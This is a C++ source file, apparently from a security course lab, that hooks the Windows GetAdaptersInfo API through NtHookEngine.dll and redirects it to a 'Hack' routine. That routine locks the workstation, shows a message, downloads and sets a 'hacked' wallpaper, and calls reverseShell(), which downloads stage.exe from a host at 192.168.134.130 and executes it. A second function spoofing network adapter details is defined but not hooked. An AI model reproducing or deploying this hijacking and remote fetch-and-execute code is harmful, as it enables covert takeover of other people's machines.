#include "HooksManager.h"
#include <iostream>
#include<Windows.h>
#include<string>
#include<urlmon.h>
#include <cstdlib>
#include <time.h>

#pragma comment(lib, "urlmon.lib")

using namespace std;

bool HooksManager::isInitialized = false;

BOOL(__cdecl *HooksManager::HookFunction)(ULONG_PTR OriginalFunction, ULONG_PTR NewFunction);
VOID(__cdecl *HooksManager::UnhookFunction)(ULONG_PTR Function);
ULONG_PTR(__cdecl *HooksManager::GetOriginalFunction)(ULONG_PTR Hook);
void Hack();
DWORD FakeGetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen);

HooksManager::HooksManager()
{
    if (!isInitialized)
    {
        if (HookFunction == NULL || UnhookFunction == NULL || GetOriginalFunction == NULL)
        {
            HMODULE hHookEngineDll = LoadLibrary(L"NtHookEngine.dll");

            HookFunction = (BOOL(__cdecl *)(ULONG_PTR, ULONG_PTR)) GetProcAddress(hHookEngineDll, "HookFunction");
            UnhookFunction = (VOID(__cdecl *)(ULONG_PTR)) GetProcAddress(hHookEngineDll, "UnhookFunction");
            GetOriginalFunction = (ULONG_PTR(__cdecl *)(ULONG_PTR)) GetProcAddress(hHookEngineDll, "GetOriginalFunction");
        }

        isInitialized = true;

        hookFunctions();
    }
}

HooksManager::~HooksManager()
{
    removeHooks();
}

void HooksManager::hookFunctions() {
    if (HookFunction == NULL || UnhookFunction == NULL || GetOriginalFunction == NULL)
        return;

    hLibrary = LoadLibrary(L"Iphlpapi.dll");
    if (hLibrary == NULL) {
        return;
    }

    HookFunction((ULONG_PTR)GetProcAddress(hLibrary, "GetAdaptersInfo"), (ULONG_PTR)Hack);
}
void HooksManager::removeHooks()
{
    if (HookFunction != NULL && UnhookFunction != NULL && GetOriginalFunction != NULL && hLibrary != NULL)
    {
        UnhookFunction((ULONG_PTR)GetProcAddress(hLibrary, "GetAdaptersInfo"));
    }
}

void changeBackground() {
    URLDownloadToFile(NULL, L"https://mielinofficial.com/wp-content/uploads/2021/06/hacker-1.jpg", L"D:\\Learning\\Lab5\\source\\x64\\Debug\\hacked.jpg", 0, NULL);

    //D:\\Learning\\Lab5\\source\\x64\\Debug\\

    LPWSTR wallpaper_file = L"D:\\Learning\\Lab5\\source\\x64\\Debug\\hacked.jpg";
    int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaper_file, SPIF_UPDATEINIFILE);
}

void showMessage(string s) {
    std::string myString = s;

    LPWSTR ws = new wchar_t[myString.size() + 1];
    copy(myString.begin(), myString.end(), ws);
    ws[myString.size()] = 0; // zero at the end

    MessageBox(NULL, ws, L"Caution", MB_ICONEXCLAMATION | MB_OK);
}

void reverseShell() {
   
    URLDownloadToFile(NULL, L"http://192.168.134.130/stage.exe", L"D:\\Learning\\Lab5\\source\\x64\\Debug\\stage.exe", 0, NULL);
    system("D:\\Learning\\Lab5\\source\\x64\\Debug\\stage.exe");
}

DWORD FakeGetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen)
{
    DWORD(*OriginalGetAdaptersInfo)(PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen);

    OriginalGetAdaptersInfo = (DWORD(*)(PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen)) HooksManager::GetOriginalFunction((ULONG_PTR)FakeGetAdaptersInfo);

    DWORD result = OriginalGetAdaptersInfo(pAdapterInfo, pOutBufLen);
    std::string fakeAdapterName = "{11111111-2222-3333-4444-555555555555}";
    std::string fakeAdapterDescription = "Fake Adapter 0001";

    if (pAdapterInfo != NULL)
    {
        strcpy_s(pAdapterInfo->AdapterName, sizeof(pAdapterInfo->AdapterName), fakeAdapterName.c_str());
        strcpy_s(pAdapterInfo->Description, sizeof(pAdapterInfo->Description), fakeAdapterDescription.c_str());

        for (int i = 0; i < sizeof(pAdapterInfo->Address); i++)
        {
            pAdapterInfo->Address[i] = (BYTE)i;
        }
    }
    return result;
}

void Hack()
{
    system("Rundll32.exe user32.dll, LockWorkStation");
    Sleep(5000);
    showMessage("I'm a ethical hacker! Contact me now 012.345.678!");
    changeBackground();
    reverseShell();
}

